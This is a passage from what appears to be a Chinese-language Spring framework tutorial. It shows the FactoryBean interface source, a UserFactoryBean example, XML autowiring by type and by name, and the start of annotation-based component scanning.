class="comment">* Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">* you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">* You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* https://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">* distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">* See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">* limitations under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> org.springframework.beans.factory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.lang.Nullable;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Interface to be implemented by objects used within a &#123;<span class="doctag">@link</span> BeanFactory&#125;</span></span><br><span class="line"><span class="comment">which</span></span><br><span class="line"><span class="comment">* are themselves factories for individual objects. If a bean implements this</span></span><br><span class="line"><span class="comment">* interface, it is used as a factory for an object to expose, not directly as a</span></span><br><span class="line"><span class="comment">* bean instance that will be exposed itself.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;&lt;b&gt;NB: A bean that implements this interface cannot be used as a normal</span></span><br><span class="line"><span class="comment">bean.&lt;/b&gt;</span></span><br><span class="line"><span class="comment">* A FactoryBean is defined in a bean style, but the object exposed for bean</span></span><br><span class="line"><span class="comment">* references (&#123;<span class="doctag">@link</span> #getObject()&#125;) is always the object that it creates.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;FactoryBeans can support singletons and prototypes, and can either create</span></span><br><span class="line"><span class="comment">* objects lazily on demand or eagerly on startup. The &#123;<span class="doctag">@link</span> SmartFactoryBean&#125;</span></span><br><span class="line"><span class="comment">* interface allows for exposing more fine-grained behavioral metadata.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;This interface is heavily used within the framework itself, for example</span></span><br><span class="line"><span class="comment">for</span></span><br><span class="line"><span class="comment">* the AOP &#123;<span class="doctag">@link</span> org.springframework.aop.framework.ProxyFactoryBean&#125; or the</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@link</span> org.springframework.jndi.JndiObjectFactoryBean&#125;. It can be used for</span></span><br><span class="line"><span class="comment">* custom components as well; however, this is only common for infrastructure</span></span><br><span class="line"><span class="comment">code.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;&lt;b&gt;&#123;<span class="doctag">@code</span> FactoryBean&#125; is a programmatic contract. Implementations are not</span></span><br><span class="line"><span class="comment">* supposed to rely on annotation-driven injection or other reflective</span></span><br><span class="line"><span class="comment">facilities.&lt;/b&gt;</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@link</span> #getObjectType()&#125; &#123;<span class="doctag">@link</span> #getObject()&#125; invocations may arrive early in</span></span><br><span class="line"><span class="comment">the</span></span><br><span class="line"><span class="comment">* bootstrap process, even ahead of any post-processor setup. If you need access</span></span><br><span class="line"><span class="comment">to</span></span><br><span class="line"><span class="comment">* other beans, implement &#123;<span class="doctag">@link</span> BeanFactoryAware&#125; and obtain them</span></span><br><span class="line"><span class="comment">programmatically.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;&lt;b&gt;The container is only responsible for managing the lifecycle of the</span></span><br><span class="line"><span class="comment">FactoryBean</span></span><br><span class="line"><span class="comment">* instance, not the lifecycle of the objects created by the FactoryBean.&lt;/b&gt;</span></span><br><span class="line"><span class="comment">Therefore,</span></span><br><span class="line"><span class="comment">* a destroy method on an exposed bean object (such as &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">java.io.Closeable#close()&#125;</span></span><br><span class="line"><span class="comment">* will &lt;i&gt;not&lt;/i&gt; be called automatically. Instead, a FactoryBean should</span></span><br><span class="line"><span class="comment">implement</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@link</span> DisposableBean&#125; and delegate any such close call to the underlying</span></span><br><span class="line"><span class="comment">object.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* &lt;p&gt;Finally, FactoryBean objects participate in the containing BeanFactory&#x27;s</span></span><br><span class="line"><span class="comment">* synchronization of bean creation. There is usually no need for internal</span></span><br><span class="line"><span class="comment">* synchronization other than for purposes of lazy initialization within the</span></span><br><span class="line"><span class="comment">* FactoryBean itself (or the like).</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> Rod Johnson</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> Juergen Hoeller</span></span><br><span class="line"><span class="comment">* <span class="doctag">@since</span> 08.03.2003</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> &lt;T&gt; the bean type</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> org.springframework.beans.factory.BeanFactory</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> org.springframework.aop.framework.ProxyFactoryBean</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> org.springframework.jndi.JndiObjectFactoryBean</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FactoryBean</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">* The name of an attribute that can be</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@link</span> org.springframework.core.AttributeAccessor#setAttribute set&#125; on a</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@link</span> org.springframework.beans.factory.config.BeanDefinition&#125; so that</span></span><br><span class="line"><span class="comment">* factory beans can signal their object type when it can&#x27;t be deduced from</span></span><br><span class="line"><span class="comment">* the factory bean class.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@since</span> 5.2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">OBJECT_TYPE_ATTRIBUTE</span> <span class="operator">=</span> <span class="string">&quot;factoryBeanObjectType&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">* Return an instance (possibly shared or independent) of the object</span></span><br><span class="line"><span class="comment">* managed by this factory.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;As with a &#123;<span class="doctag">@link</span> BeanFactory&#125;, this allows support for both the</span></span><br><span class="line"><span class="comment">* Singleton and Prototype design pattern.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;If this FactoryBean is not fully initialized yet at the time of</span></span><br><span class="line"><span class="comment">* the call (for example because it is involved in a circular reference),</span></span><br><span class="line"><span class="comment">* throw a corresponding &#123;<span class="doctag">@link</span> FactoryBeanNotInitializedException&#125;.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;As of Spring 2.0, FactoryBeans are allowed to return &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">* objects. The factory will consider this as normal value to be used; it</span></span><br><span class="line"><span class="comment">* will not throw a FactoryBeanNotInitializedException in this case anymore.</span></span><br><span class="line"><span class="comment">* FactoryBean implementations are encouraged to throw</span></span><br><span class="line"><span class="comment">* FactoryBeanNotInitializedException themselves now, as appropriate.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> an instance of the bean (can be &#123;<span class="doctag">@code</span> null&#125;)</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> Exception in case of creation errors</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> FactoryBeanNotInitializedException</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    T <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">* Return the type of object that this FactoryBean creates,</span></span><br><span class="line"><span class="comment">* or &#123;<span class="doctag">@code</span> null&#125; if not known in advance.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;This allows one to check for specific types of beans without</span></span><br><span class="line"><span class="comment">* instantiating objects, for example on autowiring.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;In the case of implementations that are creating a singleton object,</span></span><br><span class="line"><span class="comment">* this method should try to avoid singleton creation as far as possible;</span></span><br><span class="line"><span class="comment">* it should rather estimate the type in advance.</span></span><br><span class="line"><span class="comment">* For prototypes, returning a meaningful type here is advisable too.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;This method can be called &lt;i&gt;before&lt;/i&gt; this FactoryBean has</span></span><br><span class="line"><span class="comment">* been fully initialized. It must not rely on state created during</span></span><br><span class="line"><span class="comment">* initialization; of course, it can still use such state if available.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;&lt;b&gt;<span class="doctag">NOTE:</span>&lt;/b&gt; Autowiring will simply ignore FactoryBeans that return</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> null&#125; here. Therefore it is highly recommended to implement</span></span><br><span class="line"><span class="comment">* this method properly, using the current state of the FactoryBean.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the type of object that this FactoryBean creates,</span></span><br><span class="line"><span class="comment">* or &#123;<span class="doctag">@code</span> null&#125; if not known at the time of the call</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> ListableBeanFactory#getBeansOfType</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    Class&lt;?&gt; getObjectType();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">* Is the object managed by this factory a singleton? That is,</span></span><br><span class="line"><span class="comment">* will &#123;<span class="doctag">@link</span> #getObject()&#125; always return the same object</span></span><br><span class="line"><span class="comment">* (a reference that can be cached)?</span></span><br><span class="line"><span class="comment">* &lt;p&gt;&lt;b&gt;<span class="doctag">NOTE:</span>&lt;/b&gt; If a FactoryBean indicates to hold a singleton object,</span></span><br><span class="line"><span class="comment">* the object returned from &#123;<span class="doctag">@code</span> getObject()&#125; might get cached</span></span><br><span class="line"><span class="comment">* by the owning BeanFactory. Hence, do not return &#123;<span class="doctag">@code</span> true&#125;</span></span><br><span class="line"><span class="comment">* unless the FactoryBean always exposes the same reference.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;The singleton status of the FactoryBean itself will generally</span></span><br><span class="line"><span class="comment">* be provided by the owning BeanFactory; usually, it has to be</span></span><br><span class="line"><span class="comment">* defined as singleton there.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;&lt;b&gt;<span class="doctag">NOTE:</span>&lt;/b&gt; This method returning &#123;<span class="doctag">@code</span> false&#125; does not</span></span><br><span class="line"><span class="comment">* necessarily indicate that returned objects are independent instances.</span></span><br><span class="line"><span class="comment">* An implementation of the extended &#123;<span class="doctag">@link</span> SmartFactoryBean&#125; interface</span></span><br><span class="line"><span class="comment">* may explicitly indicate independent instances through its</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@link</span> SmartFactoryBean#isPrototype()&#125; method. Plain &#123;<span class="doctag">@link</span> FactoryBean&#125;</span></span><br><span class="line"><span class="comment">* implementations which do not implement this extended interface are</span></span><br><span class="line"><span class="comment">* simply assumed to always return independent instances if the</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> isSingleton()&#125; implementation returns &#123;<span class="doctag">@code</span> false&#125;.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;The default implementation returns &#123;<span class="doctag">@code</span> true&#125;, since a</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> FactoryBean&#125; typically manages a singleton instance.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> whether the exposed object is a singleton</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> #getObject()</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> SmartFactoryBean#isPrototype()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">default</span> <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②创建类UserFactoryBean"><a href="#②创建类UserFactoryBean" class="headerlink" title="②创建类UserFactoryBean"></a>②创建类UserFactoryBean</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFactoryBean</span> <span class="keyword">implements</span> <span class="title class_">FactoryBean</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> User.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③配置bean-2"><a href="#③配置bean-2" class="headerlink" title="③配置bean"></a>③配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.bean.UserFactoryBean&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④测试-2"><a href="#④测试-2" class="headerlink" title="④测试"></a>④测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUserFactoryBean</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//获取IOC容器</span></span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;springfactorybean.xml&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) ac.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-14、实验十四：基于xml的自动装配"><a href="#2-2-14、实验十四：基于xml的自动装配" class="headerlink" title="2.2.14、实验十四：基于xml的自动装配"></a>2.2.14、实验十四：基于xml的自动装配</h4><blockquote><p>自动装配：</p><p>根据指定的策略，在IOC容器中匹配某一个bean，自动为指定的bean中所依赖的类类型或接口类</p><p>型属性赋值</p></blockquote><h4 id="①场景模拟"><a href="#①场景模拟" class="headerlink" title="①场景模拟"></a>①场景模拟</h4><p>创建类UserController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserService</span><span class="params">(UserService userService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userService = userService;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>&#123;</span><br><span class="line">        userService.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口UserService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建类UserServiceImpl实现接口UserService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserDao</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span> &#123;</span><br><span class="line">        userDao.saveUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口UserDao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建类UserDaoImpl实现接口UserDao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;保存成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②配置bean-2"><a href="#②配置bean-2" class="headerlink" title="②配置bean"></a>②配置bean</h4><blockquote><p>使用bean标签的autowire属性设置自动装配效果</p><p>自动装配方式：byType</p><p>byType：根据类型匹配IOC容器中的某个兼容类型的bean，为属性自动赋值</p><p>若在IOC中，没有任何一个兼容类型的bean能够为属性赋值，则该属性不装配，即值为默认值</p><p>null</p><p>若在IOC中，有多个兼容类型的bean能够为属性赋值，则抛出异常</p><p>NoUniqueBeanDefinitionException</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userController&quot;</span><span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.controller.UserController&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span><span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.service.impl.UserServiceImpl&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>自动装配方式：byName</p><p>byName：将自动装配的属性的属性名，作为bean的id在IOC容器中匹配相对应的bean进行赋值</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userController&quot;</span><span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.controller.UserController&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span><span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.service.impl.UserServiceImpl&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userServiceImpl&quot;</span><span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.service.impl.UserServiceImpl&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.dao.impl.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDaoImpl&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.autowire.xml.dao.impl.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="③测试-2"><a href="#③测试-2" class="headerlink" title="③测试"></a>③测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAutoWireByXML</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;autowire-xml.xml&quot;</span>);</span><br><span class="line">    <span class="type">UserController</span> <span class="variable">userController</span> <span class="operator">=</span> ac.getBean(UserController.class);</span><br><span class="line">    userController.saveUser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3、基于注解管理bean"><a href="#2-3、基于注解管理bean" class="headerlink" title="2.3、基于注解管理bean"></a>2.3、基于注解管理bean</h2><h3 id="2-3-1、实验一：标记与扫描"><a href="#2-3-1、实验一：标记与扫描" class="headerlink" title="2.3.1、实验一：标记与扫描"></a>2.3.1、实验一：标记与扫描</h3><h4 id="①注解"><a href="#①注解" class="headerlink" title="①注解"></a>①注解</h4><p>和 XML 配置文件一样，注解本身并不能执行，注解本身仅仅只是做一个标记，具体的功能是框架检测</p><p>到注解标记的位置，然后针对这个位置按照注解标记的功能来执行具体操作。</p><p>本质上：所有一切的操作都是Java代码来完成的，XML和注解只是告诉框架中的Java代码如何执行。</p><p>举例：元旦联欢会要布置教室，蓝色的地方贴上元旦快乐四个字，红色的地方贴上拉花，黄色的地方贴上气球。</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/11.png"></p><p>班长做了所有标记，同学们来完成具体工作。墙上的标记相当于我们在代码中使用的注解，后面同学们做的工作，相当于框架的具体操作。</p><h4 id="②扫描"><a href="#②扫描" class="headerlink" title="②扫描"></a>②扫描</h4><p>Spring 为了知道程序员在哪些地方标记了什么注解，就需要通过扫描的方式，来进行检测。然后根据注解进行后续操作。</p><h4 id="③新建Maven-Module"><a href="#③新建Maven-Module" class="headerlink" title="③新建Maven Module"></a>③新建Maven Module</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基于Maven依赖传递性，导入spring-context依赖即可导入当前所需所有jar包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④创建Spring配置文件"><a href="#④创建Spring配置文件" class="headerlink" title="④创建Spring配置文件"></a>④创建Spring配置文件</h4><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/12.png"></p><h4 id="⑤标识组件的常用注解"><a href="#⑤标识组件的常用注解" class="headerlink" title="⑤标识组件的常用注解"></a>⑤标识组件的常用注解</h4><blockquote><p>@Component：将类标识为普通组件 @Controller：将类标识为控制层组件 @Service：将类标</p><p>识为业务层组件 @Repository：将类标识为持久层组件</p></blockquote><p>问：以上四个注解有什么关系和区别？</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/13.png"></p><p>通过查看源码我们得知，@Controller、@Service、@Repository这三个注解只是在@Component注解的基础上起了三个新的名字。</p><p>对于Spring使用IOC容器管理这些组件来说没有区别。所以@Controller、@Service、@Repository这</p><p>三个注解只是给开发人员看的，让我们能够便于分辨组件的作用。</p><p>注意：虽然它们本质上一样，但是为了代码的可读性，为了程序结构严谨我们肯定不能随便胡乱标记。</p><h4 id="⑥创建组件"><a href="#⑥创建组件" class="headerlink" title="⑥创建组件"></a>⑥创建组件</h4><p>创建控制层组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口UserService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> 